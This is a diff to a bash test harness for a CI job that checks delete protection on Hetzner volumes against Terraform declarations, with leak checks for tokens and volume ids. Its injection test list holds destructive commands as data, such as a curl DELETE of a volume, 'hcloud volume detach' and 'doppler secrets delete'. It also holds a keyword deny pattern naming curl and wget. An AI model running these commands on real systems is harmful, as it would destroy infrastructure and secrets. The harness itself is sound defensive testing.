     "GITHUB_SHA=0000000000000000000000000000000000000000" "GITHUB_RUN_ID=77" "GITHUB_REPOSITORY=o/r" "GITHUB_SERVER_URL=https://github.com"
-    "TIMEOUT_REAL=$TIMEOUT_REAL" "REAL_SLEEP=$REAL_SLEEP")
+    "TIMEOUT_REAL=$TIMEOUT_REAL" "REAL_SLEEP=$REAL_SLEEP" "REAL_DATE=$REAL_DATE")
   e+=("${STUB_ENV[@]}")
   local base ovr bod
   base=$(jq -n '[$ARGS.positional[] | capture("^(?<k>[^=]+)=(?<v>.*)$") | {key: .k, value: .v}] | from_entries' --args "${e[@]}")
   ovr=$(printf '%s\n' "${OVR[@]}" | jq -R 'select(length > 0) | capture("^(?<s>[^:]+):(?<k>[^=]+)=(?<v>.*)$")' | jq -s 'reduce .[] as $o ({}; .[$o.s][$o.k] = $o.v)')
   bod=$(printf '%s\n' "${BODIES[@]}" | jq -R 'select(length > 0) | capture("^(?<s>[^=]+)=(?<p>.*)$")' | jq -s 'reduce .[] as $o ({}; .[$o.s] = $o.p)')
   frc=$(printf '%s\n' "${FORCE[@]}" | jq -R 'select(length > 0) | capture("^(?<s>[^=]+)=(?<p>.*)$")' | jq -s 'reduce .[] as $o ({}; .[$o.s] = $o.p)')
-  jq -n --arg job "$TMP/x/job.json" --arg expr "$EXPRLIB" --arg case "$CASE" --arg x "$TMP/x" --argjson base "$base" --argjson ovr "$ovr" --argjson bod "$bod" --argjson frc "$frc" \
+  jq -n --arg job "$TMP/x/job.json" --arg entry "$ENTRY" --arg jst "$JOB_STATUS" --arg expr "$EXPRLIB" --arg case "$CASE" --arg x "$TMP/x" --argjson base "$base" --argjson ovr "$ovr" --argjson bod "$bod" --argjson frc "$frc" \
     --argjson allowed "$ALLOWED_OUT" --arg dop "$DOPTOK" --argjson norun "$NO_RUN" --arg ref "$GH_REF" \
-    '{job: $job, expr: $expr, case: $case, x: $x, base_env: $base, overrides: $ovr, bodies: $bod, force_outcome: $frc, allowed_outputs: $allowed, no_run: $norun,
+    '{job: $job, entry: $entry, job_status: $jst, expr: $expr, case: $case, x: $x, base_env: $base, overrides: $ovr, bodies: $bod, force_outcome: $frc, allowed_outputs: $allowed, no_run: $norun,
       github: {ref: $ref, token: "synthetic-github-token", repository: "o/r", server_url: "https://github.com", run_id: "77"},
       secrets: {DOPPLER_TOKEN: $dop, RESEND_API_KEY: "synthetic-resend_key"}}' > "$CASE/spec.json" || fatal "write spec"
   local rc=0
@@ -861,22 +1285,65 @@ invariants() { # the checks every case owes, whatever it asserts
     if [[ -s "$f" ]]; then CHK+=$'\n    '"stub refusal or violation: $(head -c 160 "$f" | tr '\n' ';')"; fi
   done
   if [[ -s "$CASE/github_env" ]]; then CHK+=$'\n    '"GITHUB_ENV is not empty (a token would persist into later steps)"; fi
+  # Every verdict log line of the probe and the gate names THIS case's entry directly after verdict=<v> (CTO ruling 26; the
+  # ::warning:: line is left alone, its note names the subject).
+  local _vl
+  while IFS= read -r _vl; do
+    [[ -n "$_vl" ]] || continue
+    [[ "$_vl" =~ sole-copy-check\ verdict=[^\ ]*\ entry=${ENTRY}\  ]] || CHK+=$'\n    '"a verdict log line lacks ' entry=$ENTRY ' directly after verdict=: $(head -c 160 <<<"$_vl")"
+  done < <(cat "$CASE/probe.log" "$CASE/gate.log" 2>/dev/null | grep -F 'sole-copy-check verdict=' | grep -v '^::warning::' || true)
+  # ...and the lines are THERE (review round 2): a probe that ran its real body prints its finish line exactly once (none when its
+  # EXIT trap published instead), and a gate that ran prints exactly one verdict line, clean or ::error::.
+  # The verdict each line names is the PUBLISHED one (review verification pass, V4): the re-protect tracker's event-grep reads the
+  # log line, so a line that says matches-declared while the probe published another verdict would close it as PASS. The
+  # published verdict is the probe's last `verdict=` output (the value the gate's VERDICT renders from); the gate prints `none`
+  # for an empty one.
+  if [[ -f "$CASE/result.json" ]]; then
+    local _want _got _pv _lv
+    _pv=$(sed -n 's/^verdict=//p' "$CASE/out/probe" 2>/dev/null | tail -n 1)
+    if [[ "$(rs probe ran)" == true ]] && ! grep -q '^probe=' < <(printf '%s\n' "${BODIES[@]}"); then
+      _want=1; if grep -qF 'probe ended without a verdict' "$CASE/probe.log" 2>/dev/null; then _want=0; fi
+      _got=$(grep -c '^sole-copy-check verdict=' "$CASE/probe.log" 2>/dev/null) || _got=0
+      [[ "$_got" == "$_want" ]] || CHK+=$'\n    '"the probe printed $_got verdict line(s), want $_want"
+      while IFS= read -r _lv; do
+        [[ "$_lv" == "$_pv" ]] || CHK+=$'\n    '"the probe's verdict line says verdict=$_lv, the published verdict is '$_pv'"
+      done < <(sed -n 's/^sole-copy-check verdict=\([^ ]*\).*/\1/p' "$CASE/probe.log" 2>/dev/null)
+    fi
+    if [[ "$(rs gate ran)" == true ]]; then
+      _got=$(grep -cE '^(::error::)?sole-copy-check verdict=' "$CASE/gate.log" 2>/dev/null) || _got=0
+      [[ "$_got" == 1 ]] || CHK+=$'\n    '"the gate printed $_got verdict line(s), want 1"
+      while IFS= read -r _lv; do
+        [[ "$_lv" == "${_pv:-none}" ]] || CHK+=$'\n    '"the gate's verdict line says verdict=$_lv, the published verdict is '${_pv:-none}'"
+      done < <(sed -n 's/^\(::error::\)\{0,1\}sole-copy-check verdict=\([^ ]*\).*/\2/p' "$CASE/gate.log" 2>/dev/null)
+    fi
+  fi
   if [[ -f "$CASE/out/probe" ]] && grep -q '<<' "$CASE/out/probe"; then CHK+=$'\n    '"a heredoc-form output reached the probe's GITHUB_OUTPUT"; fi
   for f in "$CASE"/out/* "$CASE"/*.log "$CASE/summary" "$SCEN/issues.json"; do
     [[ -f "$f" ]] || continue
     filt=$(grep -v '^::add-mask::' "$f" || true)
-    if grep -qF -e "$TOK" -e "$RWTOK" -e "$DOPTOK" -e "$TOKPFX" -e "$RWPFX" -e "$DOPPFX" -e "$WEB1_ID" -e "$CANARY" <<<"$filt"; then CHK+=$'\n    '"a token (or a 6-character prefix of one), the other volume's id or an API label reached $(basename "$f")"; fi
+    if grep -qF -e "$TOK" -e "$RWTOK" -e "$DOPTOK" -e "$TOKPFX" -e "$RWPFX" -e "$DOPPFX" -e "$OTHER_ID" -e "$CANARY" <<<"$filt"; then CHK+=$'\n    '"a token (or a 6-character prefix of one), the other volume's id or an API label reached $(basename "$f")"; fi
   done
+  # NEITHER volume id may reach an issue title, body or comment (a public, notifying sink), whichever leg filed it.
+  if [[ -f "$SCEN/issues.json" ]] && grep -qF -e "$VOL_ID" -e "$OTHER_ID" < <(jq -r '.[] | .title, .body, (.comments[]?)' "$SCEN/issues.json" 2>/dev/null); then
+    CHK+=$'\n    '"a volume id reached an issue title, body or comment"
+  fi
   for f in "$CASE"/curl.*.argv; do
     [[ -e "$f" ]] || continue
     argv=$(tr '\0' '\n' < "$f"); url=$(grep '^https://' <<<"$argv" || true)
     a "request URL" "$url" "https://api.hetzner.cloud/v1/volumes?name=${CASE_NAME}&per_page=50"
     if grep -qF -e "$TOK" -e "$RWTOK" -e "$TOKPFX" -e "$RWPFX" <<<"$argv"; then CHK+=$'\n    '"a token is on a request's argument list"; fi
     a "request credential channel" "$(cat "${f%.argv}.stdin")" "header = \"Authorization: Bearer ${CASE_TOK}\""
+    if grep -qF -e "$OTHER_NAME" -e "$OTHER_ID" "$f" "${f%.argv}.stdin" "${f%.argv}.env" 2>/dev/null; then CHK+=$'\n    '"a request's argv, stdin or environment carries the other entry's name or id"; fi
   done
+  # The commit-time read asks for THIS entry's declaration file, and nothing else.
+  local _gp
+  while IFS= read -r _gp; do
+    [[ -n "$_gp" ]] || continue
+    a "commits read path" "$_gp" "gh api commits path=$TF_STEM"
+  done < <(grep '^gh api commits' "$SEQ" 2>/dev/null || true)
 }
 end_row() { invariants; CHK+="$INV_ACC"; INV_ACC=""; INV_DONE=1; ROWS_RUN=$((ROWS_RUN + 1)); if [[ -z "$CHK" ]]; then pass "$1 $2"; else fail "$1 $2$CHK"; fi; }
-V="verdict="; OK_KEYS="expected=true|name=$NAME"
+V="verdict="
 warn_has() { grep -qF -- "$1" "$CASE/probe.log" || CHK+=$'\n    '"the warning annotation lacks '$1'"; }
 add_unrelated() { # 36 NEWER open infra-drift issues of other titles (gh lists newest first, default limit 30): a list that is not asked for 100 hides the older one
   jq '. + [range(100; 136) | {number: ., title: ("infra: drift detected in web-platform \(.)"), state: "open", labels: ["infra-drift"], milestone: "", body: "", author: "app/github-actions", comments: []}]' "$SCEN/issues.json" > "$SCEN/i.tmp" && mv "$SCEN/i.tmp" "$SCEN/issues.json"
@@ -889,7 +1356,7 @@ _ctl=$(set -o pipefail; export SHELLOPTS; bash --noprofile --norc -e "$TMP/selft
 if [[ "$_pf" == 1 && "$_ctl" != 0 ]]; then pass "S0 the runner shell is -e without pipefail: 'false | true' passes, a bare false stops the body, and an exported SHELLOPTS is scrubbed"
 else fail "S0 harness shell: scrubbed rc=$_pf (want 1), unscrubbed control rc=$_ctl"; fi
 _x=$(python3 "$EXPRLIB" value "steps.probe.outputs.verdict == 'x'" '{}'); _y=$(python3 "$EXPRLIB" if "always() && steps.probe.outputs.verdict != 'a'" '{"__job_status":"failure"}'); _z=$(python3 "$EXPRLIB" if "steps.probe.outputs.verdict == 'a'" '{"__job_status":"failure","steps.probe.outputs.verdict":"a"}')
-if [[ "$_x" == false && "$_y" == true && "$_z" == false ]] && ! python3 "$EXPRLIB" if "a === b" '{}' >/dev/null 2>&1; then pass "S0b the expression interpreter: null != 'a' holds under always(), the implicit success() skips after a failure, unknown syntax is a harness error"
+if [[ "$_x" == false && "$_y" == true && "$_z" == false ]] && ! python3 "$EXPRLIB" if "a === b" '{}' >/dev/null 2>&1; then pass "S0b the expression interpreter: null != 'a' holds under always(), the implicit success() skips after a failure, and unknown syntax is a harness error"
 else fail "S0b interpreter self-test ($_x/$_y/$_z)"; fi
 
 # ---------------------------------------------------------------------------------------------------------
@@ -904,9 +1371,11 @@ new_case; live false; set_age 5; go; want_out "${V}lift-pending-apply|$OK_KEYS|l
 grep -q '^::warning::' "$CASE/probe.log" || CHK+=$'\n    '"no ::warning:: annotation"; [[ -s "$CASE/summary" ]] || CHK+=$'\n    '"no job-summary line"
 warn_has "unprotected at Hetzner until the re-protect change applies"; grep -qF "until the re-protect change applies" "$CASE/summary" || CHK+=$'\n    '"the summary line lacks the verdict-specific text"
 end_row V3 "declared true, live false, .tf changed 5 min ago -> lift-pending-apply: green with a warning and a summary line, no issue"
-new_case; live false; set_age 89; go; a "89 min" "$(sed -n 's/^verdict=//p' "$CASE/out/probe")" lift-pending-apply; _keep="$CHK"
-new_case; live false; set_age 91; go; CHK+="$_keep"; a "91 min" "$(sed -n 's/^verdict=//p' "$CASE/out/probe")" lifted-outside-terraform
-end_row V3b "grace boundary: 89 minutes is still pending, 91 minutes files (exactly 90 is deliberately NOT pinned: the age is wall-clock)"
+FAKE_NOW=$(date +%s)
+new_case; STUB_ENV+=("FAKE_NOW=$FAKE_NOW"); live false; set_age 89; go; a "89 min" "$(sed -n 's/^verdict=//p' "$CASE/out/probe")" lift-pending-apply; _keep="$CHK"
+new_case; STUB_ENV+=("FAKE_NOW=$FAKE_NOW"); live false; set_age 91; go; CHK+="$_keep"; a "91 min" "$(sed -n 's/^verdict=//p' "$CASE/out/probe")" lifted-outside-terraform
+FAKE_NOW=""
+end_row V3b "grace boundary on a pinned clock: 89 minutes is still pending, 91 minutes files (exactly 90 is deliberately NOT pinned)"
 for _m in none future; do
   new_case; live false; set_age "$_m"; go; want_out "${V}lifted-outside-terraform|$OK_KEYS|live=false|volume_id=$VOL_ID|http=200"; want_steps ran skip skip ran 1
   end_row V3c "an unreadable (${_m}) .tf commit time fails open to lifted-outside-terraform"
@@ -961,6 +1430,7 @@ end_row M15 "must-pass: extra fields and reordered keys in the body"
 new_case; raw '{"meta":{"pagination":{"next_page":null,"page":1}},"volumes":['"$_v1"']}'; go
 want_out "${V}matches-declared|$OK_KEYS|live=true|volume_id=$VOL_ID|http=200"; want_steps skip skip ran skip 0
 end_row M16 "must-pass: a listing whose next_page is explicitly null, keys reordered"
+bad_body M17 "two concatenated JSON documents, the first a clean listing and the second the volume unprotected" "$(listing "$_v1")$(listing "$(jq -c '.protection.delete = false' <<<"$_v1")")"
 
 echo "H: HTTP, retries and credentials"
 for _c in 404 500 429; do
@@ -1001,13 +1471,13 @@ for _n in soleur-alpha-store zz9-other-name; do
   new_case; tf "$_n" true; go; want_out "${V}matches-declared|expected=true|name=$_n|live=true|volume_id=$VOL_ID|http=200"; want_steps skip skip ran skip 0
   end_row "T1/$_n" "a different declared name flows into the request URL and the outputs (a hard-coded name would red)"
 done
-new_case; sed -i 's/^  delete_protection = true # trailing comment$/  delete_protection = false # was true/' "$WS/apps/web-platform/infra/inngest-redis-luks.tf"; live false; go
+new_case; sed -i 's/^  delete_protection = true # trailing comment$/  delete_protection = false # was true/' "$WS/$TF_REL"; live false; go
 want_out "${V}unprotected-as-declared|$(sed 's/true/false/' <<<"$OK_KEYS")|live=false|volume_id=$VOL_ID|http=200"
 end_row T2 "a trailing comment and a commented-out opposite value are ignored (declared false read through them)"
 tf_bad() { # tf_bad <id> <description> <sed-expression> [<expected ::error:: text>]
   new_case; mk_tf "$CASE/ref" "$NAME" true
-  sed -i "$3" "$WS/apps/web-platform/infra/inngest-redis-luks.tf"
-  if cmp -s "$WS/apps/web-platform/infra/inngest-redis-luks.tf" "$CASE/ref/apps/web-platform/infra/inngest-redis-luks.tf"; then CHK+=$'\n    '"the mutation did not land"; fi
+  sed -i "$3" "$WS/$TF_REL"
+  if cmp -s "$WS/$TF_REL" "$CASE/ref/$TF_REL"; then CHK+=$'\n    '"the mutation did not land"; fi
   go; want_out "${V}could-not-read"; want_steps skip ran skip skip 1; want_req 0
   if [[ -n "${4:-}" ]]; then grep -qF -e "$4" "$CASE/probe.log" || CHK+=$'\n    '"the ::error:: text lacks '$4'"; fi
   end_row "$1" "$2 -> could-not-read with no request"
@@ -1020,7 +1490,7 @@ tf_bad T7 "no own delete_protection, only the next resource's decoy" '/^  delete
 tf_bad T8 "an invalid name (uppercase)" 's/^  name  *= "[^"]*"/  name = "BAD_Name"/'
 tf_bad T10 "a BLOCK-commented delete_protection = true on its own lines (Terraform would apply the default false)" 's|^  delete_protection = true.*$|  /*\n  delete_protection = true\n  */|' "a block-comment opener '/*' anywhere in the file"
 tf_bad T11 "a block-commented decoy resource of the real name placed before the real one" 's|^resource "hcloud_volume" "inngest_redis_luks" {|/*\nresource "hcloud_volume" "inngest_redis_luks" {\n  name = "decoy"\n  delete_protection = false\n}\n*/\n&|'
-new_case; ( cat >> "$WS/apps/web-platform/infra/inngest-redis-luks.tf" <<< $'resource "hcloud_volume" "decoy2" {\n  delete_protection = false\n}' ); go
+new_case; ( cat >> "$WS/$TF_REL" <<< $'resource "hcloud_volume" "decoy2" {\n  delete_protection = false\n}' ); go
 want_out "${V}matches-declared|$OK_KEYS|live=true|volume_id=$VOL_ID|http=200"
 end_row T9 "a decoy delete_protection = false in a LATER resource does not leak into the block (bounded at its closing brace)"
 
@@ -1050,9 +1520,11 @@ read -r _rname _rexp <<<"$_ind"
 new_case; WS="$REPO_ROOT"; CASE_NAME="$_rname"; set_api "$_rexp"; go
 _rverd=matches-declared; if [[ "$_rexp" == false ]]; then _rverd=unprotected-as-declared; fi
 want_out "${V}${_rverd}|expected=$_rexp|name=$_rname|live=$_rexp|volume_id=$VOL_ID|http=200"
-end_row R1 "the probe on the REAL checkout derives '$_rname' and declared=$_rexp exactly as an independent derivation does (never the literal)"
+a "the resource line of the real file" "$(grep -cE "^resource \"hcloud_volume\" \"$TF_RES\" \{\$" "$TFREAL")" 1
+a "the real Inngest name" "$_rname" "$NAME"
+end_row R1 "the probe on the REAL checkout derives '$_rname' and declared=$_rexp exactly as an independent derivation does (never the literal), and the real name is use_entry's (the web-1 leg's other-entry ban checks it)"
 for _mut in rename var dup; do
-  new_case; assert_fixture_dir "${WS-}"; _tf="$WS/apps/web-platform/infra/inngest-redis-luks.tf"; assert_fixture_dir "$_tf"; mkdir -p "$(dirname "$_tf")"; cp "$TFREAL" "$_tf"
+  new_case; assert_fixture_dir "${WS-}"; _tf="$WS/$TF_REL"; assert_fixture_dir "$_tf"; mkdir -p "$(dirname "$_tf")"; cp "$TFREAL" "$_tf"
   case "$_mut" in
     rename) sed -i 's/resource "hcloud_volume" "inngest_redis_luks" {/resource "hcloud_volume" "inngest_redis_luks_x" {/' "$_tf" ;;
     var) sed -i '/^resource "hcloud_volume" "inngest_redis_luks" {/,/^}/ s/^  delete_protection = .*/  delete_protection = var.x/' "$_tf" ;;
@@ -1067,10 +1539,6 @@ done
 echo "F: filers, lifecycle, partial failures (a stateful issue store; the whole job is run)"
 # ---------------------------------------------------------------------------------------------------------
 issues() { jq -r "$1" "$SCEN/issues.json"; }
-TITLE_DIFF="infra: Inngest store volume delete protection differs from Terraform ($NAME)"
-TITLE_GONE="infra: Inngest store volume not found at Hetzner ($NAME)"
-TITLE_NOCRED="infra: the Inngest store volume protection check has no usable credential ($NAME)"
-TITLE_UNREAD="infra: the Inngest store volume protection check could not read Hetzner ($NAME)"
 new_scen
 new_case; live false; go
 a "issues filed" "$(issues 'length')" 1; a "title" "$(issues '.[0].title')" "$TITLE_DIFF"
@@ -1081,7 +1549,12 @@ a "email body names the finding filer outcome" "$(jq -r '.steps.notify.with.body
 a "resend-api-key renders to the secret" "$(jq -r '.steps.notify.with["resend-api-key"]' "$CASE/result.json")" synthetic-resend_key
 FB=$(issues '.[0].body')
 a "remedy names the 5c row and the runbook file" "$(grep -c 'table row `not-protected` in inngest-luks-cutover-6894.md' <<<"$FB")" 1; a "remedy names the dispatch" "$(grep -c '`manual-rerun` dispatch' <<<"$FB")" 1; a "remedy names the read-back" "$(grep -c 'read back `protected`' <<<"$FB")" 1
-end_row F1 "first lifted run: ONE p1 issue with the exact title, labels, milestone, public-safe pointers and an actionable remedy; email subject, body (with the filer outcomes) and key rendered"
+arm_exact "$FB" "$LEAD_DIFF" "$REMEDY_DIFF" "$DECISION"; no_other_words "the body" "$FB"
+no_other_words "the email" "$(jq -r '.steps.notify.with.subject, .steps.notify.with.body' "$CASE/result.json")"
+a "email subject, exactly" "$(jq -r '.steps.notify.with.subject' "$CASE/result.json")" "[INFRA DRIFT] Inngest store volume protection check needs attention"
+a "email body names the volume" "$(jq -r '.steps.notify.with.body' "$CASE/result.json" | grep -c '<strong>The twice-daily Inngest store volume protection check needs attention.</strong>')" 1
+a "email body names the ADR" "$(jq -r '.steps.notify.with.body' "$CASE/result.json" | grep -c 'carries the facts and the pointers (ADR-282)')" 1
+end_row F1 "first lifted run: ONE p1 issue with the exact title, labels, milestone, lead, remedy and decision lines and no web-1 wording; email subject, body (with the filer outcomes, no web-1 wording) and key rendered"
 new_case; live false; go
 a "issues after the second run" "$(issues 'length')" 1; a "comments" "$(issues '.[0].comments | length')" 1
 a "comment is one line" "$(issues '.[0].comments[0]' | grep -c .)" 1
@@ -1130,7 +1603,7 @@ want_steps skip ran skip skip 1
 end_row F11 "an UNKNOWN verdict files the could-not-perform issue and the gate is red"
 # Rendered bodies: only the named dynamic fields may differ between two renders, and no recipe vocabulary.
 # The dispatch is named (`manual-rerun`) and never spelled: no gh, no `workflow run`, no apply_target, no -f key=value input, no apply workflow file.
-recipe_vocab() { grep -qiE '\b(curl|hcloud|doppler|wget|gh)\b|workflow run|apply_target|-f [a-z_]+=|apply-[a-z0-9-]*\.yml|sole copy|only copy|106903269| -X |--request|change_protection|detach' <<<"$1" || grep -qE '\b(DELETE|PUT|POST|PATCH)\b' <<<"$1"; }
+recipe_vocab() { grep -qiE '\b(curl|hcloud|doppler|wget|gh)\b|workflow run|apply_target|-f [a-z_]+=|apply-[a-z0-9-]*\.yml|sole copy|only copy|106903269|106443278| -X |--request|change_protection|detach' <<<"$1" || grep -qE '\b(DELETE|PUT|POST|PATCH)\b' <<<"$1"; }
 render_body() { # render_body <verdict> <suffix>: the probe is replaced by a body publishing these outputs, the REAL filers run
   new_scen; new_case
   printf 'printf "verdict=%%s\\nname=zzn%s\\nexpected=true\\nlive=false\\nhttp=40%s\\ntf_age_min=77%s\\n" "%s" >> "$GITHUB_OUTPUT"\n' "$2" "$2" "$2" "$1" > "$TMP/probe-$2.sh"
@@ -1143,10 +1616,11 @@ for _vd in lifted-outside-terraform volume-not-found no-token could-not-read; do
   if [[ "$_n1" != "$_n2" ]]; then CHK+=$'\n    '"the body differs in more than the named fields"; fi
   if ! grep -q -e 'zzn1' -e 'HTTP code: 401' <<<"$_b1"; then CHK+=$'\n    '"neither the volume name nor the HTTP code is in the body (the render did not reach the filer)"; fi
   if recipe_vocab "$_b1"; then CHK+=$'\n    '"the body holds recipe vocabulary or the Hetzner id"; fi
-  end_row "F12/$_vd" "the rendered filer body has only the named dynamic fields and no recipe vocabulary"
+  if grep -qiE -- "$OTHER_WORDS" <<<"$_b1"; then CHK+=$'\n    '"the Inngest body names the web-1 volume, its ADR or its runbook"; fi
+  end_row "F12/$_vd" "the rendered filer body has only the named dynamic fields, no recipe vocabulary and no web-1 wording"
 done
 CHK=""; _inj_ok=1
-for _inj in 'curl -sS -X DELETE https://api.hetzner.cloud/v1/volumes/1' 'hcloud volume detach 1' 'doppler secrets delete X' 'volume 106903269' 'the only copy' \
+for _inj in 'curl -sS -X DELETE https://api.hetzner.cloud/v1/volumes/1' 'hcloud volume detach 1' 'doppler secrets delete X' 'volume 106903269' 'volume 106443278' 'the only copy' \
   'Run gh workflow run apply-web-platform-infra.yml -f apply_target=manual-rerun.' 'gh issue close 3' 'then workflow run it' 'apply_target=manual-rerun' \
   'pass -f reason=x' 'the file apply-web-platform-infra.yml'; do
   recipe_vocab "$_b1"$'\n'"$_inj" || { _inj_ok=0; echo "    not flagged: $_inj"; }
@@ -1180,7 +1654,7 @@ new_case; STUB_ENV+=("CURL_NOFILTER=1"); go
 a "unfiltered listing is not a clean answer" "$(sed -n 's/^verdict=//p' "$CASE/out/probe")" volume-not-found
 end_row L2 "with the name= filter dropped the stub serves the unfiltered listing (the other volume among them) -> volume-not-found, proving the filter is what excludes it"
 
-new_case; raw "not json $CANARY $TOK $RWTOK $WEB1_ID"; go
+new_case; raw "not json $CANARY $TOK $RWTOK $OTHER_ID"; go
 want_out "${V}could-not-read|$OK_KEYS|http=200"; want_steps skip ran skip skip 1
 end_row L3 "a malformed body carrying a label, both tokens and the other volume's id is never echoed, filed or published"
 
@@ -1260,7 +1734,8 @@ a "vnf title" "$(issues '.[0].title')" "$TITLE_GONE"; a "vnf labels" "$(issues '
 a "reason pointer" "$(issues '.[0].body' | grep -c 'names the reason (zero, many or id-mismatch)')" 1
 a "incident route" "$(issues '.[0].body' | grep -c 'soleur:incident')" 1; a "total loss section, in the named runbook file" "$(issues '.[0].body' | grep -c 'After a total loss.* in inngest-luks-cutover-6894.md')" 1
 a "confirm before escalating" "$(issues '.[0].body' | grep -c '^Confirm the Hetzner listing first')" 1; a "escalate only if the volume is gone" "$(issues '.[0].body' | grep -c 'Only if the volume is gone, treat it as a total loss')" 1
-end_row X5 "volume-not-found issue: exact title, p1 labels, the reason pointer and the incident route"
+arm_exact "$(issues '.[0].body')" "$LEAD_GONE" "$REMEDY_GONE" "$DECISION"; no_other_words "the body" "$(issues '.[0].body')"
+end_row X5 "volume-not-found issue: exact title, p1 labels, the reason pointer, the incident route, the exact lead, remedy and decision lines and no web-1 wording"
 new_case; go
 a "vnf issue closed by a matches-declared run" "$(issues '.[0].state')" closed
 end_row X6 "a matches-declared run closes the volume-not-found issue"
@@ -1286,12 +1761,14 @@ UB=$(issues '.[0].body')
 a "verdict" "$(grep -c -- '- Check verdict: no-token$' <<<"$UB")" 1; a "http" "$(grep -c -- '- HTTP code: 401$' <<<"$UB")" 1
 a "run url" "$(grep -c -- '- Run: https://github.com/o/r/actions/runs/77$' <<<"$UB")" 1; a "ADR pointer" "$(grep -c 'ADR-282' <<<"$UB")" 1
 a "closing text" "$(grep -c 'a matches-declared run closes it' <<<"$UB")" 1; a "no stale closing text" "$(grep -c 'a clean run closes it' <<<"$UB")" 0
+no_other_words "the no-token body" "$UB"
 _keep="$CHK"; new_scen; new_case; CODES=500; go; CHK+="$_keep"
+no_other_words "the could-not-read body" "$(issues '.[0].body')"
 a "could-not-read body names the closing verdict" "$(issues '.[0].body' | grep -c 'a matches-declared run closes it')" 1
 a "could-not-read body points at the first failed or skipped step" "$(issues '.[0].body' | grep -c 'read the first failed or skipped step of the run (the probe, or an earlier step if the probe was skipped)')" 1
 a "no stale pointer to the probe step alone" "$(issues '.[0].body' | grep -c 'read the probe step')" 0
 a "a readable name carries no name-unreadable sentence" "$(issues '.[0].body' | grep -c 'no volume name could be read')" 0
-end_row X9 "the could-not-perform bodies carry verdict, HTTP, run URL, the ADR pointer and the right closing text"
+end_row X9 "the could-not-perform bodies carry verdict, HTTP, run URL, the ADR pointer and the right closing text, and no web-1 wording"
 new_case; CODES="502 504 200"; go; want_out "${V}matches-declared|$OK_KEYS|live=true|volume_id=$VOL_ID|http=200"; want_steps skip skip ran skip 0; want_req 3
 end_row X10 "502, 504, 200 -> retried to a clean answer"
 for _c in 204 301 418; do
@@ -1397,20 +1874,231 @@ want_steps skip ran skip skip 1
 end_row X17b "a VERIFIED tarball that does not extract (the doppler member missing): the install step is red, nothing is put on PATH, the probe is skipped and the gate is red (an extraction failure is never swallowed)"
 
 # ---------------------------------------------------------------------------------------------------------
+echo "W: the web-1 workspaces volume entry (the arms where a row value changes the outcome; shared paths stay single-run)"
+# ---------------------------------------------------------------------------------------------------------
+switch_entry web1
+new_scen
+new_case; go; a "entry" "$ENTRY" web1
+want_out "${V}matches-declared|$OK_KEYS|live=true|volume_id=$VOL_ID|http=200"; want_steps skip skip ran skip 0; want_req 1
+end_row WV1 "web-1: declared true, live true -> matches-declared with the web-1 name and id; green, the clear step runs, no email"
+r_wlifted() { new_case; live false; go; want_out "${V}lifted-outside-terraform|$OK_KEYS|live=false|volume_id=$VOL_ID|http=200"; want_steps ran skip skip ran 1; }
+r_wlifted; end_row WV2 "web-1: declared true, live false, workspaces-luks.tf unchanged for 3 h -> lifted-outside-terraform: finding filer, email, red gate"
+new_case; live false; set_age 5; go; want_out "${V}lift-pending-apply|$OK_KEYS|live=false|volume_id=$VOL_ID|http=200"; want_steps skip skip skip skip 0
+warn_has "the web-1 workspaces volume is unprotected at Hetzner until the re-protect change applies"
+grep -qF "the web-1 workspaces volume is unprotected at Hetzner until the re-protect change applies" "$CASE/summary" || CHK+=$'\n    '"the summary line lacks the web-1 subject"
+end_row WV3 "web-1: workspaces-luks.tf changed 5 min ago -> lift-pending-apply, warned and summarized under the web-1 subject"
+new_case; tf "$NAME" false; live false; go; want_out "${V}unprotected-as-declared|expected=false|name=$NAME|live=false|volume_id=$VOL_ID|http=200"; want_steps skip skip skip skip 0
+warn_has "the web-1 workspaces volume is unprotected, as declared"
+end_row WV4 "web-1: declared false, live false -> unprotected-as-declared, warned under the web-1 subject"
+new_case; tf "$NAME" false; live true; go; want_out "${V}lift-not-applied|expected=false|name=$NAME|live=true|volume_id=$VOL_ID|http=200"; want_steps skip skip skip skip 0
+warn_has "the web-1 workspaces volume is still protected at Hetzner although the declaration says unprotected"
+end_row WV5 "web-1: declared false, live true -> lift-not-applied, warned under the web-1 subject"
+r_wempty() { new_case; listing > "$CASE/listing.json"; go; want_out "${V}volume-not-found|$OK_KEYS|http=200"; want_steps ran skip skip ran 1; }
+r_wempty; vnf_reason zero; end_row WV6 "web-1: an EMPTY listing -> volume-not-found (reason zero): finding filer, red"
+r_wid() { new_case; listing "$(vol "$OTHER_ID" "$NAME" true)" > "$CASE/listing.json"; go; want_out "${V}volume-not-found|$OK_KEYS|http=200"; want_steps ran skip skip ran 1; }
+r_wid; vnf_reason id-mismatch; end_row WV8 "web-1: a same-name volume carrying the Inngest id -> volume-not-found reason=id-mismatch, never matches-declared"
+tf_bad WT3 "the web-1 resource renamed" "s/\"$TF_RES\" {/\"${TF_RES}_x\" {/"
+_wind=$(python3 -I - "$REPO_ROOT/$TF_REL" "$TF_RES" <<'PYW'
+import re, sys
+t = open(sys.argv[1]).read()
+ms = list(re.finditer(r'(?m)^resource\s+"hcloud_volume"\s+"%s"\s*\{\s*$' % re.escape(sys.argv[2]), t))
+if len(ms) != 1:
+    sys.exit("resource line matched %d times" % len(ms))
+i, d, out = ms[0].end(), 1, []
+while d:
+    c = t[i]
+    d += (c == "{") - (c == "}")
+    out.append(c)
+    i += 1
+blk, depth, top = "".join(out), 0, []
+for ln in blk.splitlines():
+    code = re.sub(r"\s*#.*$", "", ln)
+    if depth == 0:
+        top.append(code)
+    depth += code.count("{") - code.count("}")
+name = re.search(r'^\s*name\s*=\s*"([^"]+)"', "\n".join(top), re.M).group(1)
+dp = re.search(r"^\s*delete_protection\s*=\s*(true|false)\s*$", "\n".join(top), re.M).group(1)
+print("%s %s" % (name, dp))
+PYW
+) || fatal "independent derivation of the real web-1 .tf failed"
+read -r _wname _wexp <<<"$_wind"
+new_case; WS="$REPO_ROOT"; CASE_NAME="$_wname"; set_api "$_wexp"; go
+_wverd=matches-declared; if [[ "$_wexp" == false ]]; then _wverd=unprotected-as-declared; fi
+want_out "${V}${_wverd}|expected=$_wexp|name=$_wname|live=$_wexp|volume_id=$VOL_ID|http=200"
+a "the resource line of the real file" "$(grep -cE "^resource \"hcloud_volume\" \"$TF_RES\" \{\$" "$REPO_ROOT/$TF_REL")" 1
+a "the real web-1 name" "$_wname" "$NAME"
+end_row WR1 "the probe on the REAL workspaces-luks.tf derives '$_wname' and declared=$_wexp exactly as an independent derivation does (path and resource from use_entry, never from the rows)"
+new_scen; new_case; live false; go
